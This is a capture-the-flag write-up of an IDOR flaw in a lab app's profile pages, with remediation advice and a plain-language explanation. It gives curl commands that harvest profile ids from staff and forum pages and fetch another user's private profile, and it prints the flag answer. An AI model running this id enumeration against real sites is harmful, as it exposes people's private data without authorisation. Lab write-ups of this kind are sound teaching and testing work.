# Flag 03 — IDOR on profile pages

**Flag:** `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`
**Location:** `GET /profile/{id}` — another user's profile (wil's) exposes a private field in plain view.
**Severity:** High
**Class:** IDOR / broken access control — object served by guessable id with no ownership or role check.

## Discovery

Profile pages are addressed by object id, e.g. jdoe's is `/profile/z4p1cnx47mfy50f` (the id is exposed in the forum "View profile →" link and in `/staff`). Nothing ties the viewer to the profile owner, so requesting another user's id returns their profile — including a field that should be private.

## Exploitation

Collect user ids, then request each profile directly. wil's profile shows the flag with no authorisation barrier:

```bash
# harvest profile ids from pages you can already see
curl -s -b jdoe.txt http://TARGET:4942/staff  | grep -oE '/profile/[a-z0-9]+' | sort -u
curl -s     http://TARGET:4942/forum          | grep -oE '/profile/[a-z0-9]+' | sort -u

# request another user's profile directly
curl -s -b jdoe.txt http://TARGET:4942/profile/k1asdfeditojrb4 | grep -i flag
# FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
```

> wil's profile id is `k1asdfeditojrb4`, harvested from the `/forum` and `/staff` "View profile →" links.

## Impact

Any user (or an unauthenticated visitor, depending on the endpoint's auth) can read other users' profile data — private notes, recovery codes, role, and here a flag — simply by changing the id in the URL. Combined with the grades IDOR (Flag 01's endpoint), an attacker can enumerate every user's private data.

## Remediation

- Enforce authorisation on every object access: a user may view only their own profile unless a server-side role check grants broader access.
- Do not place private fields (notes, recovery codes, secrets) in a view that is keyed solely by a guessable id.
- Prefer unguessable identifiers *and* access control — obscurity alone is not a fix.

## In simple terms

Every profile page has an ID in its web address, like `/profile/abc123`. We just changed that ID to someone else's (wil's) and the site showed us his private profile — including a flag — without ever checking whether that profile belonged to us.

It's like a hotel where room 204's key also opens 205, 206, 207… because the doors never check whose key it is. Lesson: before showing someone a thing, confirm they're actually allowed to see it.
